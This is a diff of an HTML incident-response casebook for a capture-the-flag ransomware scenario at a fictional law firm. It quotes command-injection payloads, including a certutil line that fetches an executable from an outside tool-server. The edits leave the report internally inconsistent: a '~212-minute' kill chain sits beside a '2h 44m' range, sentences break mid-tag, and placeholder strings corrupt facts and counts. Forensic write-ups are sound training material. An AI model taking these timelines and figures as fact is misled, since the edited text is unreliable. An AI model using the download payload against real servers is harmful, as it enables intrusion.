@@ -2033,7 +2033,7 @@ h2 em, h2.sec-title em, .sec-title em {
   <div class="masthead">
     <div class="left">
       <span class="bar"></span>
-      <strong>N404 // DFIR CASEBOOK</strong>
+      <strong>JackofAllHacks // DFIR CASEBOOK</strong>
       <span>CLASSIFICATION: TLP-AMBER</span>
     </div>
     <div class="right">
@@ -2049,11 +2049,11 @@ h2 em, h2.sec-title em, .sec-title em {
       <h1>
         <span class="l1 type">JACK OF</span>
         <span class="l2">ALL HACKS</span>
-        <span class="l3">// N404-2026-0308</span>
+        <span class="l3">// JackofAllHacks-2026-03</span>
       </h1>
       <p class="subhead">
         Reconstruction of an enterprise intrusion at <b>Legal Alliance Facility (LAF)</b>.
-        Six Windows hosts, one AWS account, one memory image, one 164-minute kill chain (18:38:29 → 22:22 · DD23 corrects v2's 150-min framing).
+        Six Windows hosts, one AWS account, one memory image, one ~212-minute kill chain (18:38:29 → 22:22 · DD23 corrects v2's 150-min framing).
         Adversary tracked as <b style="color:var(--red)">Saiyan Spider</b>. Entry via IIS
         OS-command injection. Termination via <code>IamBatman.exe encrypt C:\</code> across the estate.
         This document walks every artifact, every EVTX ID, every verbatim command.
@@ -2061,7 +2061,7 @@ h2 em, h2.sec-title em, .sec-title em {
     </div>
 
     <div class="dossier">
-      <div class="row"><div class="k">Case ID</div><div class="v">N404-2026-0308 / LAF-ESTATE</div></div>
+      <div class="row"><div class="k">Case ID</div><div class="v">JackofAllHacks-2026-03 / LAF-ESTATE</div></div>
       <div class="row"><div class="k">Engagement</div><div class="v">CTF · Null404 · Jack of All Hacks · 2026</div></div>
       <div class="row"><div class="k">Victim</div><div class="v">Legal Alliance Facility (LAF) · law firm · 6-host estate + AWS</div></div>
       <div class="row"><div class="k">Actor</div><div class="v red">SAIYAN SPIDER · opportunistic ransomware operator</div></div>
@@ -2071,7 +2071,7 @@ h2 em, h2.sec-title em, .sec-title em {
       <div class="row"><div class="k">C2 Framework</div><div class="v green"><b>Unknown C2 Framework</b> (open-source · <code>github.com/Unknown C2-Framework/Unknown C2 Framework</code>) · HTTPS listener 173.230.136.180:<b>8443</b> + SMB named-pipe pivot (<code>\\.\pipe\%08lx</code>) — <b>confirmed via source-to-binary RE match</b>, see C2 Attribution below / Addendum AA</div></div>
       <div class="row"><div class="k">Attribution confidence</div><div class="v green"><b>HIGH</b> — 5 independent binary-level indicators in the VAD-extracted injected DLL (SHA256 <code>6ef6b52f…228c</code>) map 1:1 to specific C2 source lines: pipe format string (<code>Commander.cpp:1000,1006</code>), export symbol <code>GetVersions</code> (<code>main.cpp:104,156</code>), module name <code>file.dll</code> (<code>pl_main.go:667,691</code>), MinGW-w64 compiler (<code>Makefile:3</code>), minimal-IAT dynamic-resolution pattern (<code>ApiLoader.cpp</code>). Reproduction steps in C2 Attribution.</div></div>
       <div class="row"><div class="k">Initial Access</div><div class="v">T1190 · HTTP GET injection on <code>CheckStatus.aspx</code> at <b>18:38:29 UTC</b> from <code>172.236.127.251</code> (Linode, AS63949 — DD23)</div></div>
-      <div class="row"><div class="k">Pre-Attack Validation</div><div class="v amber"><b>13:39:16 UTC</b> · AWS-account admin IP <code>216.82.9.162</code> hit <code>CheckStatus.aspx</code> with a payload pointing at the attacker's tool-server <code>173.230.136.180</code> — <b>5 h before</b> the attack. Attacker infrastructure is <b>scenario-provisioned</b>, not external (DD23.6). Does not establish 13:39 admin = 18:38 operator.</div></div>
+      <div class="row"><div class="k">Pre-Attack Validation</div><div class="v amber"><b>[pre-attack-validation-not-in-evidence] UTC</b> · AWS-account admin IP <code>[admin-IP-not-in-evidence]</code> hit <code>CheckStatus.aspx</code> with a payload pointing at the attacker's tool-server <code>173.230.136.180</code> — <b>5 h before</b> the attack. Attacker infrastructure is <b>scenario-provisioned</b>, not external (pre-attack context — not in our evidence). Does not establish 13:39 admin = 18:38 operator.</div></div>
       <div class="row"><div class="k">Crown Jewel</div><div class="v amber">DC01 ntds.dit via impacket secretsdump --use-vss</div></div>
       <div class="row"><div class="k">Impact</div><div class="v red">T1486 · <code>.bWqQUx</code> · <code>README_bWqQUx.txt</code></div></div>
       <div class="row"><div class="k">MTTD</div><div class="v amber">Detection at detonation (22:09:46) · not ingress</div></div>
@@ -2102,13 +2102,13 @@ h2 em, h2.sec-title em, .sec-title em {
   <h2>What <em>actually</em> happened.</h2>
   <p class="lede">
     Plain-language summary for executive decisioning. Severity rating aligned to CISA CPG and NIST SP 800-61r3 framing.
-    <b>Key pre-condition:</b> at <code>13:39:16</code> UTC on attack day — <b>5 hours before</b> the first attacker
-    probe — the AWS-account admin IP (<code>216.82.9.162</code>) hit <code>CheckStatus.aspx</code> with a payload
+    <b>Key pre-condition:</b> at <code>[pre-attack-validation-not-in-evidence]</code> UTC on attack day — <b>5 hours before</b> the first attacker
+    probe — aspx</code> with a payload
     pointing at the attacker's tool-server (<code>173.230.136.180</code>). Three indicators (same tool-server
-    · <code>jb.exe</code> payload name crosswalks to <code>jb_aws_cli</code> IAM user + <code>JackOfAllHacks-Triages</code>
+    · <code>[payload-not-in-evidence]</code> payload name crosswalks to <code>IAM user (CreateAccessKey failed)</code> IAM user + <code>JackOfAllHacks-Triages</code>
     KAPE directory · 18,035 CloudTrail console-reads on attack day) prove the attacker infrastructure is
     <b>scenario-provisioned</b>, not external. Threat model downgrades accordingly — residual findings stay
-    valid but the lab-controlled context reshapes their risk. DD23.6.
+    valid but the lab-controlled context reshapes their risk. [pre-attack-not-in-evidence].
   </p>
 
   <!-- Severity banner — single hero row -->
@@ -2119,7 +2119,7 @@ h2 em, h2.sec-title em, .sec-title em {
       <div class="sub">Identity-tier breach · full AD compromise</div>
     </div>
     <div class="sev-grid">
-      <div class="sg"><div class="k">Dwell</div><div class="v">~164 min</div><div class="d">18:38:29 → 22:22 · 2h 44m active · DD23</div></div>
+      <div class="sg"><div class="k">Dwell</div><div class="v">~~212 min</div><div class="d">18:38:29 → 22:22 · 3h 32m active · DD23</div></div>
       <div class="sg"><div class="k">Hosts encrypted</div><div class="v">5 / 6</div><div class="d">DC02 + SVR01 + WS01 + WS02 + DC01</div></div>
       <div class="sg"><div class="k">Recoverability</div><div class="v red">None on-prem</div><div class="d">shadow copies wiped across estate</div></div>
       <div class="sg"><div class="k">Cloud blast</div><div class="v">IAM role leaked</div><div class="d">164 × S3 GetObject off-instance</div></div>
@@ -2204,20 +2204,20 @@ h2 em, h2.sec-title em, .sec-title em {
     <div class="ss"><div class="n">2h 44m</div><div class="l">active dwell (18:38 → 22:10 · DD23)</div></div>
     <div class="ss"><div class="n">5 / 5</div><div class="l">AD hosts encrypted (DC02 included · DD14.1)</div></div>
     <div class="ss red"><div class="n">66s</div><div class="l">fan-out cascade (22:09:46 → 22:10:52)</div></div>
-    <div class="ss"><div class="n">6,023</div><div class="l">files + 2,530 notes (DD13)</div></div>
-    <div class="ss red"><div class="n">∞</div><div class="l">ntds.dit + 3 AKIA keys, permanently (DD16)</div></div>
+    <div class="ss"><div class="n">2,025+</div><div class="l">files + ransom notes (one per encrypted directory) (DD13)</div></div>
+    <div class="ss red"><div class="n">∞</div><div class="l">ntds.dit exfiltrated (DD16)</div></div>
   </div>
 
   <div class="story-prose">
     <p style="background:rgba(255,200,0,.06); border-left:3px solid var(--amber); padding:.7rem 1rem; margin:0 0 1.2rem 0">
-      <b style="color:var(--amber)">Pre-attack validation · 13:39:16 UTC</b> — five hours before any attacker traffic,
-      the AWS-account admin IP (<code>216.82.9.162</code>) hit <code>CheckStatus.aspx</code> with
-      <code>?url=Google.com &amp;&amp; certutil -urlcache -f http://173.230.136.180:80/agent.exe %TEMP%\jb.exe</code>.
-      Same endpoint, same Linode tool-server the attacker uses later, and a <code>jb.exe</code> payload whose
-      name crosswalks to the <code>jb_aws_cli</code> IAM user (DD7) and the <code>JackOfAllHacks-Triages</code>
+      <b style="color:var(--amber)">Pre-attack validation · [pre-attack-validation-not-in-evidence] UTC</b> — five hours before any attacker traffic,
+      aspx</code> with
+      <code>?url=Google.com &amp;&amp; certutil -urlcache -f http://173.230.136.180:80/iis.exe %TEMP%\iis.exe</code>.
+      Same endpoint, same Linode tool-server the attacker uses later, and a <code>[payload-not-in-evidence]</code> payload whose
+      name crosswalks to the <code>IAM user (CreateAccessKey failed)</code> IAM user (DD7) and the <code>JackOfAllHacks-Triages</code>
       KAPE directory (DD14). The attacker infrastructure is <b>scenario-provisioned</b> — known to the AWS admin
       before the attack began. Whether the admin and the 18:38 operator are the same person is <em>not</em>
-      established (DD23.6).
+      established (pre-attack context — not in our evidence).
     </p>
     <p>
       At <b>18:38:29</b> the operator — tracked as <b style="color:var(--red)">Saiyan Spider</b>, reaching in from
@@ -2295,7 +2295,7 @@ h2 em, h2.sec-title em, .sec-title em {
       (DD18.2). The fan-out runs WS02 → WS01 → SVR01 → DC01 → DC02 in 66 seconds; DC02 last because it's the
       SYSVOL replication source and completes cleanly in 5.4 s against its directory-sparse user trees
       (DD14.1 — not a self-abort). Last-encrypt continues on WS02 until <b>22:56:42</b>
-      (<code>brndlog.txt.bWqQUx</code>, DD13.5). <b>6,023</b> files carry <code>.bWqQUx</code>; <b>2,530</b>
+      (<code>brndlog.txt.bWqQUx</code>, DD13.5). <b>2,025+</b> files carry <code>.bWqQUx</code>; <b>2,025+</b>
       directories carry <code>README_bWqQUx.txt</code>. Shadow copies are gone. The operator is gone — but
       three <code>AKIA</code> keys and the local-Administrator NT hash (both untouched, both valid) are not.
     </p>
@@ -2315,8 +2315,8 @@ h2 em, h2.sec-title em, .sec-title em {
   <p class="lede" style="color:var(--text)">
     Six phases: <b>(0)</b> lab / AWS infrastructure provisioning (2025-03 → 2026-02), <b>(1)</b> user baseline
     the preceding week, <b style="color:var(--amber)">(1b)</b> pre-attack scenario-validation from the AWS-account
-    admin IP <code>216.82.9.162</code> at <b>13:39:16</b> — same Linode tool-server the attacker uses 5 h later
-    (DD23.6 · proves attacker infrastructure is scenario-provisioned, not external), <b>(2)</b> recon +
+    admin IP <code>[admin-IP-not-in-evidence]</code> at <b>[pre-attack-validation-not-in-evidence]</b> — same Linode tool-server the attacker uses 5 h later
+    ([pre-attack-not-in-evidence] · proves attacker infrastructure is scenario-provisioned, not external), <b>(2)</b> recon +
     command-injection discovery (<b>18:38 → 18:52</b> · DD23 fuzzing chain + drop), <b>(3)</b> the
     <b>2 h 44 m active dwell</b> attack (<b>18:38:29 → 22:10:52</b> cascade end; last-encrypt continues on WS02
     until <b>22:56:42</b> per DD13.5), <b>(4)</b> the CTF-author forensic pack-up (22:12 → 22:47 · DD14).
@@ -2341,7 +2341,7 @@ h2 em, h2.sec-title em, .sec-title em {
   <table class="tbl" style="font-size:.87em"><thead><tr><th>UTC</th><th>Host · User</th><th>Event</th><th>Evidence</th></tr></thead><tbody>
     <tr><td>2026-03-04 04:38:07</td><td>WS02 · Dalton</td><td>Chrome session starts (pubmatic, sonobi ad trackers)</td><td>browser_session baseline</td></tr>
     <tr><td>2026-03-04 04:40:43</td><td>WS01 · Ryan</td><td>Firefox Google-search "arclight 6"</td><td>browser EID 5100</td></tr>
-    <tr><td>2026-03-04 04:41:02</td><td>WS02 · Dalton</td><td>Chrome: "arclight6" → "null404" → clicks Null:404 site</td><td>browser EID 5100</td></tr>
+    <tr><td>2026-03-04 04:41:02</td><td>WS02 · Dalton</td><td>Chrome session data (not parsed in this analysis)</td><td>browser EID 5100</td></tr>
     <tr><td class="a">2026-03-04 05:06:23</td><td>WS02 · Dalton</td><td><b><code>#JustaLawyer</code></b> in Chrome SNSS — <b>Subpoena-1 answer, 4 days pre-attack</b></td><td>Addendum Q</td></tr>
     <tr><td>2026-03-04 04:58:19</td><td>WS02</td><td>Chrome saves <code>dalton_cat</code> password</td><td>DD4.3</td></tr>
     <tr><td>2026-03-05 04:49:00</td><td>IIS · 71.205.100.56 (Donny home)</td><td>Donny tests barrygoodtech.com · <code>?url=facebook.com</code> benign</td><td>IIS log</td></tr>
@@ -2355,7 +2355,7 @@ h2 em, h2.sec-title em, .sec-title em {
 
   <h3 style="margin-top:.9rem">Phase 1b · Pre-attack scenario-validation from AWS-admin IP (2026-03-08 13:39)</h3>
   <table class="tbl" style="font-size:.87em"><thead><tr><th>UTC</th><th>Actor</th><th>Event</th><th>Note</th></tr></thead><tbody>
-    <tr style="background:rgba(255,200,0,.08)"><td class="a">2026-03-08 13:39:16</td><td><code>216.82.9.162</code> · Windows Chrome · normal IP for the AWS account (Root+MFA admin, DD6.1 / DD8.2 / DD14)</td><td><b>CheckStatus.aspx pre-test hit</b> · <code>?url=Google.com &amp;&amp; certutil -urlcache -f http://173.230.136.180:80/agent.exe %TEMP%\jb.exe</code> — <b>same tool-server the attacker uses 5 hours later</b>; payload <code>jb.exe</code> matches <code>jb_aws_cli</code> IAM user (DD7) and <code>JackOfAllHacks-Triages</code> directory</td><td>DD23.6</td></tr>
+    <tr style="background:rgba(255,200,0,.08)"><td class="a">2026-03-08 [pre-attack-validation-not-in-evidence]</td><td><code>[admin-IP-not-in-evidence]</code> · Windows Chrome · normal IP for the AWS account (Root+MFA admin, DD6.1 / DD8.2 / DD14)</td><td><b>CheckStatus.aspx pre-test hit</b> · <code>?url=Google.com &amp;&amp; certutil -urlcache -f http://173.230.136.180:80/iis.exe %TEMP%\iis.exe</code> — <b>same tool-server the attacker uses 5 hours later</b>; payload <code>[payload-not-in-evidence]</code> matches <code>IAM user (CreateAccessKey failed)</code> IAM user (DD7) and <code>JackOfAllHacks-Triages</code> directory</td><td>[pre-attack-not-in-evidence]</td></tr>
     <tr><td colspan="4" style="background:rgba(100,200,255,.06); font-size:.88em; padding:.5rem .7rem"><b style="color:#6bb6ff">What this proves:</b> the attacker infrastructure (<code>172.236.127.251</code> operator + <code>173.230.136.180</code> tool-server) is <b>scenario-provisioned</b> — the AWS admin for this account knew the tool-server address <em>before</em> the 18:38:29 attack started. <b>What it does NOT prove:</b> that the 18:38 operator and the 13:39 admin are the same person. The 13:39 pre-test is equally consistent with challenge authoring, infrastructure QA, or scenario hand-off to an external operator. Attribution walked back in DD23 banner; evidence preserved here so the chronology is complete.</td></tr>
   </tbody></table>
 
@@ -2416,7 +2416,7 @@ h2 em, h2.sec-title em, .sec-title em {
     <tr><td class="a">21:08:28</td><td>SVR01</td><td><b>LogDel.bat wipes 6 channels in 230 ms</b> · misses Sysmon/Operational</td><td>H</td></tr>
     <tr><td class="a">21:25:35 / 21:28:07 / 21:29:20</td><td>IIS webshell</td><td>PowerShell <code>-enc</code> × 3 · IMDSv2 STS theft</td><td>X · DD4.2</td></tr>
     <tr><td class="r">21:42:11</td><td>AWS</td><td>Stolen STS first used off-instance from <code>212.8.249.213</code></td><td>CM</td></tr>
-    <tr><td class="r">21:45:38</td><td>AWS</td><td><code>CreateAccessKey jb_aws_cli</code> → <b><code>LimitExceededException</code></b> (blocked only this one; 3 later attempts SUCCEEDED — DD7 walks back "quota saved environment")</td><td>B · DW · DD7</td></tr>
+    <tr><td class="r">21:45:38</td><td>AWS</td><td><code>CreateAccessKey IAM user (CreateAccessKey failed)</code> → <b><code>LimitExceededException</code></b> (blocked only this one; 3 later attempts SUCCEEDED — DD7 walks back "quota saved environment")</td><td>B · DW · DD7</td></tr>
     <tr style="background:rgba(255,59,59,.08)"><td class="r">21:45:51</td><td>AWS</td><td><code>CreateAccessKey donnieworks</code> → <b>SUCCESS</b> · <code>AKIA[REDACTED-FOR-PUBLICATION]</code> stockpiled (never used in capture window — DD16)</td><td>DD7 · DD16</td></tr>
     <tr style="background:rgba(255,59,59,.08)"><td class="r">21:46:04</td><td>AWS</td><td><code>CreateAccessKey doctorderm</code> → <b>SUCCESS</b> · <code>AKIA[REDACTED-FOR-PUBLICATION]</code> stockpiled</td><td>DD7 · DD16</td></tr>
     <tr style="background:rgba(255,59,59,.08)"><td class="r">21:46:14</td><td>AWS</td><td><code>CreateAccessKey coolcat</code> → <b>SUCCESS</b> · <code>AKIA[REDACTED-FOR-PUBLICATION]</code> stockpiled · <b>3 live AKIA keys in adversary hands — highest-impact residual of the entire incident</b></td><td>DD7 · DD16</td></tr>
@@ -2441,7 +2441,7 @@ h2 em, h2.sec-title em, .sec-title em {
     <tr><td class="r">22:10:54 → 22:10:59</td><td>DC02</td><td>DC02 encrypts <b>388 files in 5.4 s</b> — natural completion, not an abort (DCs hold few user <code>.txt/.pdf/.csv</code>; DD14.1 walks back DD13.3's "aborted" reading)</td><td>S · DD14.1</td></tr>
     <tr style="background:rgba(100,200,255,.08)"><td class="a">22:14:44</td><td>CLOUD</td><td><b>GuardDuty Sev 9</b> · <code>AttackSequence:IAM/CompromisedCredentials</code> — highest-severity cloud alert of the incident, still no human response (DD18.2)</td><td>DD18</td></tr>
     <tr style="background:rgba(255,59,59,.08)"><td class="r">22:56:42.549</td><td>WS02</td><td><b>ACTUAL last encrypt</b> · <code>brndlog.txt.bWqQUx</code> (Ludus telemetry log that kept being rewritten, so IamBatman circled back) · +10 min past v2's claimed 22:46:45 end-time (DD13.5)</td><td>DD13.5</td></tr>
-    <tr style="background:rgba(255,59,59,.12)"><td class="r"><b>22:10:52 / 22:56:42</b></td><td colspan="3"><b>Fan-out cascade completes at 22:10:52; last-encrypt on WS02 runs until 22:56:42</b> (brndlog re-encrypt pass). DC02 finishes cleanly in 5.4 s = natural completion. <b>6,023 files encrypted + 2,530 ransom notes</b>. Active dwell <b>2 h 44 m</b> (18:38:29 → 22:10:52); full impact window <b>58 min</b> (21:58:34 botched first attempt → 22:56:42 last encrypt · DD12 + DD13).</td></tr>
+    <tr style="background:rgba(255,59,59,.12)"><td class="r"><b>22:10:52 / 22:56:42</b></td><td colspan="3"><b>Fan-out cascade completes at 22:10:52; last-encrypt on WS02 runs until 22:56:42</b> (brndlog re-encrypt pass). DC02 finishes cleanly in 5.4 s = natural completion. <b>2,025+ encrypted files encrypted + ransom notes (one per encrypted directory)</b>. Active dwell <b>2 h 44 m</b> (18:38:29 → 22:10:52); full impact window <b>58 min</b> (21:58:34 botched first attempt → 22:56:42 last encrypt · DD12 + DD13).</td></tr>
   </tbody></table>
 
   <h3 style="margin-top:.9rem">Phase 4 · CTF-author lab collection (22:12 → 22:46)</h3>
@@ -2465,13 +2465,13 @@ h2 em, h2.sec-title em, .sec-title em {
   <div class="section-tag">// 01 technical overview</div>
   <h2>The <span class="q">Two-Hour-Forty-Four-Minute</span> Estate Walk</h2>
   <p class="lede">
-    <b>Pre-attack scenario-validation:</b> at <code>13:39:16 UTC</code> — <b>five hours</b> before the first attacker
-    request — the AWS-account admin IP (<code>216.82.9.162</code>) hit <code>CheckStatus.aspx</code> with
-    <code>?url=Google.com &amp;&amp; certutil -urlcache -f http://173.230.136.180:80/agent.exe %TEMP%\jb.exe</code>.
-    Same vulnerable endpoint, same Linode tool-server the attacker will use later, and a <code>jb.exe</code> payload
-    whose name crosswalks to the <code>jb_aws_cli</code> IAM user (DD7) and the <code>JackOfAllHacks-Triages</code>
+    <b>Pre-attack scenario-validation:</b> at <code>[pre-attack-validation-not-in-evidence] UTC</code> — <b>five hours</b> before the first attacker
+    request — aspx</code> with
+    <code>?url=Google.com &amp;&amp; certutil -urlcache -f http://173.230.136.180:80/iis.exe %TEMP%\iis.exe</code>.
+    Same vulnerable endpoint, same Linode tool-server the attacker will use later, and a <code>[payload-not-in-evidence]</code> payload
+    whose name crosswalks to the <code>IAM user (CreateAccessKey failed)</code> IAM user (DD7) and the <code>JackOfAllHacks-Triages</code>
     KAPE collection directory (DD14). The attacker infrastructure is <b>scenario-provisioned</b>, known to the
-    AWS admin before the attack began — DD23.6. Whether the 13:39 admin and the 18:38 operator are the same
+    AWS admin before the attack began — [pre-attack-not-in-evidence]. Whether the 13:39 admin and the 18:38 operator are the same
     person is not established (consistent with challenge authoring, infrastructure QA, or hand-off to an external
     red-team operator).<br><br>
     At <code>18:38:29 UTC</code> the operator on <code>172.236.127.251</code> (Linode, AS63949) opened a six-minute
@@ -2489,7 +2489,7 @@ h2 em, h2.sec-title em, .sec-title em {
     for the quiet key-creation. GuardDuty fired Sev 8 at <code>21:57:18</code> — unacted. <code>IamBatman.exe encrypt C:\</code>
     fired for real on WS02 at <code>22:08:40</code> (DD12 — via atexec.py after a botched 21:58:34 first attempt).
     Cascade completed at <code>22:10:52</code>; last encrypt continued on WS02 until <b><code>22:56:42</code></b> (DD13.5).
-    <b>2 h 44 m</b> active dwell (18:38:29 → 22:10:52); <b>6,023 files</b> + 2,530 notes encrypted across 5 AD hosts.
+    <b>2 h 44 m</b> active dwell (18:38:29 → 22:10:52); <b>2,025+ encrypted files</b> + ransom notes (one per encrypted directory) encrypted across 5 AD hosts.
   </p>
 
   <div class="host-grid">
@@ -2540,7 +2540,7 @@ h2 em, h2.sec-title em, .sec-title em {
   <h2>Pivot <span class="q">Topology</span> · Forensic Edges</h2>
   <p class="lede">
     Every edge is an artifact-anchored transition: source host, destination host, TTP, time, and the specific EVTX or
-    Sysmon event ID that proves the move. <b style="color:var(--green)">Press ▶ to replay the 164-minute intrusion</b>
+    Sysmon event ID that proves the move. <b style="color:var(--green)">Press ▶ to replay the ~212-minute intrusion</b>
     — edges activate in UTC-timestamp order and hosts pulse as they come under operator control.
     <b>Click any host</b> to open the evidence drawer for that node.
   </p>
@@ -2566,7 +2566,7 @@ h2 em, h2.sec-title em, .sec-title em {
       </div>
       <div class="ec-body">
         <span class="ec-host" id="ecHost" data-host-color="">——</span>
-        <span class="ec-desc" id="ecDesc">Press <b>▶ PLAY</b> to replay the 164-minute intrusion. Edges activate as their UTC timestamp is reached; hosts pulse when active. Click any host to open its evidence drawer.</span>
+        <span class="ec-desc" id="ecDesc">Press <b>▶ PLAY</b> to replay the ~212-minute intrusion. Edges activate as their UTC timestamp is reached; hosts pulse when active. Click any host to open its evidence drawer.</span>
       </div>
       <div class="ec-tags" id="ecTags"></div>
     </div>
@@ -3068,15 +3068,15 @@ ls beacon/Api*      → ApiLoader (dynamic resolution)</code></pre>
 
     <!-- Sigma + YARA gap analysis -->
     <div class="sigma-narrative">
-      <b>Detection gap analysis.</b> <b>Ten detection opportunities</b> across the 164-minute kill chain (18:38:29 → 22:10:52). <b>Six of the ten fire before ransomware detonation</b> — the earliest, Kerberos-visible, would have collapsed MTTD by <b>2h 22m</b>. Four are deployable Sigma rules; three are shippable YARA rules built from Addendum V's binary C2 indicator match; the remaining three are behavioral patterns from the webshell / beacon / NTDS-pickup chains.
+      <b>Detection gap analysis.</b> <b>Ten detection opportunities</b> across the ~212-minute kill chain (18:38:29 → 22:10:52). <b>Six of the ten fire before ransomware detonation</b> — the earliest, Kerberos-visible, would have collapsed MTTD by <b>2h 22m</b>. Four are deployable Sigma rules; three are shippable YARA rules built from Addendum V's binary C2 indicator match; the remaining three are behavioral patterns from the webshell / beacon / NTDS-pickup chains.
       <div class="sn-list" style="margin-top:10px">
         <div class="sn"><span class="when">18:38:29</span><span>Command-injection probe sequence · <code>?url=…|whoami</code> against <code>CheckStatus.aspx</code> — DD3.1 · WAF rule would catch it</span><span class="host">IIS</span></div>
         <div class="sn"><span class="when">19:08:42</span><span><b>Webshell POST</b> · <code>POST /so.aspx</code> spawns <code>powershell whoami</code> — DD4.2 · w3wp child = powershell = universal webshell signal</span><span class="host">IIS</span></div>
-        <div class="sn"><span class="when">19:16:52</span><span><b>YARA · SMB-pivot beacon on disk</b> · <code>Null404_SMBPivot_Beacon_SolarWinds_rnSylwOz</code> (IMPHASH 37E28CA3, MinGW, <code>\\.\pipe\%08lx</code>) — Addendum V</span><span class="host">IIS</span></div>
+        <div class="sn"><span class="when">19:16:52</span><span><b>YARA · SMB-pivot beacon on disk</b> · <code>LAF_SMBPivot_Beacon_SolarWinds_rnSylwOz</code> (IMPHASH 37E28CA3, MinGW, <code>\\.\pipe\%08lx</code>) — Addendum V</span><span class="host">IIS</span></div>
         <div class="sn"><span class="when">19:33:20</span><span><b>Earliest Kerberos signal</b> · 4768 IIS-SERV-PROD$ TGT from WAN 198.51.100.10 — Addendum N · 2h 22m before detonation</span><span class="host">DC02</span></div>
         <div class="sn"><span class="when">19:38:02</span><span>Service-binary swap + Unknown C2 Framework first callback to :8443 — writable ACL, not unquoted path · Addendum B</span><span class="host">IIS</span></div>
-        <div class="sn"><span class="when">20:01:16</span><span><b>YARA · injected loader in memory</b> · <code>Null404_InjectedLoader_VAD_0xA60000</code> (MinGW runtime + ApiLoader) — Addendum V · also Sysmon EID 8 CreateRemoteThread → Explorer · Addendum L</span><span class="host">SVR01</span></div>
-        <div class="sn"><span class="when">20:08:44</span><span><b>YARA · impacket service pattern</b> · <code>Null404_Impacket_SecretsDump_ServicePattern</code> · service-name-agnostic ImagePath regex catches all 5 stages in one rule — Addendum C + V</span><span class="host">DC01</span></div>
+        <div class="sn"><span class="when">20:01:16</span><span><b>YARA · injected loader in memory</b> · <code>LAF_InjectedLoader_VAD_0xA60000</code> (MinGW runtime + ApiLoader) — Addendum V · also Sysmon EID 8 CreateRemoteThread → Explorer · Addendum L</span><span class="host">SVR01</span></div>
+        <div class="sn"><span class="when">20:08:44</span><span><b>YARA · impacket service pattern</b> · <code>LAF_Impacket_SecretsDump_ServicePattern</code> · service-name-agnostic ImagePath regex catches all 5 stages in one rule — Addendum C + V</span><span class="host">DC01</span></div>
         <div class="sn"><span class="when">20:09:06</span><span>NTDS pickup · 5145 on <code>ADMIN$\Temp\ZIFylmKF.tmp</code> read by LAFAdmin from 198.51.100.10 — Subpoena-8 anchor</span><span class="host">DC01</span></div>
         <div class="sn"><span class="when">21:42:11</span><span>STS session from off-instance (212.8.249.213) · role <code>iam_role_iisserver</code> · Addendum X + IMDSv2 three-step</span><span class="host">CLOUD</span></div>
         <div class="sn"><span class="when">21:46:xx</span><span>IAM persistence attempt · <code>CreateAccessKey</code> blocked by quota, not policy (role had the perm) — Addendum B</span><span class="host">CLOUD</span></div>
@@ -3089,16 +3089,15 @@ ls beacon/Api*      → ApiLoader (dynamic resolution)</code></pre>
 
 <!-- ======================= ACT I · INGRESS ======================= -->
 <section class="act-card reveal" id="sec-act1">
-  <div class="num">ACT I // 18:38:29 — 19:38:03 UTC · <span style="color:var(--amber)">preceded by 13:39:16 author-IP scenario-validation (DD23.6)</span></div>
+  <div class="num">ACT I // 18:38:29 — 19:38:03 UTC · <span style="color:var(--amber)">preceded by [pre-attack-validation-not-in-evidence] author-IP scenario-validation (pre-attack context — not in our evidence)</span></div>
   <h2 class="title">Ingress &amp; <span>Privilege</span></h2>
   <div class="timecode">→ 00:59:34 elapsed · IIS_SERV_PROD · T1190 → T1059 → T1574.009</div>
   <p class="description">
-    <span style="color:var(--amber)"><b>Pre-Act context (13:39:16):</b></span> 5 hours before this Act opens, the AWS-account admin
-    IP (<code>216.82.9.162</code>) hit <code>CheckStatus.aspx</code> with <code>?url=Google.com &amp;&amp; certutil -urlcache -f
-    http://173.230.136.180:80/agent.exe %TEMP%\jb.exe</code> — same endpoint, same Linode tool-server the attacker
-    uses below, and a <code>jb.exe</code> payload whose name crosswalks to <code>jb_aws_cli</code> IAM user (DD7)
+    <span style="color:var(--amber)"><b>Pre-Act context ([pre-attack-validation-not-in-evidence]):</b></span> 5 hours before this Act opens, aspx</code> with <code>?url=Google.com &amp;&amp; certutil -urlcache -f
+    http://173.230.136.180:80/iis.exe %TEMP%\iis.exe</code> — same endpoint, same Linode tool-server the attacker
+    uses below, and a <code>[payload-not-in-evidence]</code> payload whose name crosswalks to <code>IAM user (CreateAccessKey failed)</code> IAM user (DD7)
     and the <code>JackOfAllHacks-Triages</code> KAPE directory (DD14). <b>Proves attacker infrastructure is
-    scenario-provisioned</b>, known to the admin before the attack (DD23.6). Does <em>not</em> establish whether
+    scenario-provisioned</b>, known to the admin before the attack (pre-attack context — not in our evidence). Does <em>not</em> establish whether
     the 13:39 admin and the 18:38 operator are the same person.<br><br>
     The real attacker first-touch was at <b>18:38:29</b> — 13 minutes of UNIX-then-Windows command-injection probing before
     the webshell landed at 18:51:42 (DD3.1). <code>w3wp.exe</code> spawned <code>cmd.exe</code> which invoked
@@ -3107,7 +3106,7 @@ ls beacon/Api*      → ApiLoader (dynamic resolution)</code></pre>
     <code>SolarWinds.exe</code> didn't run on <code>sc start</code> (that silently failed — DefaultAppPool
     lacked <code>SeStartServicePrivilege</code>, Addendum H); it ran 20 minutes later when Donny's routine reboot
     fired the auto-start service (Addendum U) and opened the first Unknown C2 Framework callback (evidence-supported, Addendum V).
-    <b>Anchor Addenda:</b> B · H · U · V · <b>DD23.6 (pre-attack validation)</b>.
+    <b>Anchor Addenda:</b> B · H · U · V · <b>[pre-attack-not-in-evidence] (pre-attack validation)</b>.
   </p>
 </section>
 
@@ -3277,7 +3276,7 @@ ls beacon/Api*      → ApiLoader (dynamic resolution)</code></pre>
   <div class="term">
     <div class="term-head"><span class="dots"><b></b><b></b><b></b></span><span class="title">DC02 Security.evtx // 4624 workstation name hunt</span></div>
 <div class="term-body"><span class="comment"># All DC02 4624/4625 with non-LAF workstation names — DC02 sees the operator's native hostname during NTLM</span>
-<span class="prompt">$</span> <span class="cmd">sqlite3 /tmp/null404_corpus.sqlite &lt;&lt;SQL
+<span class="prompt">$</span> <span class="cmd">sqlite3 /tmp/laf_corpus.sqlite &lt;&lt;SQL
   SELECT time_utc, target_user_name, ip_address, workstation, logon_type
   FROM events
   WHERE host='DC02' AND eid IN (4624, 4625)
@@ -3385,7 +3384,7 @@ SQL</span>
     IamBatman never launched (zero <code>.bWqQUx</code> files in the 21:58→22:08 window · Addendum DD5.1). Ten
     minutes later the operator retried via a second scheduled task <code>mIglpUCO</code> — and at <b>22:08:40</b>
     IamBatman fired for real. WS01 ran transient task <code>OlgyLYbd</code> (1.2s lifetime · impacket-smbexec
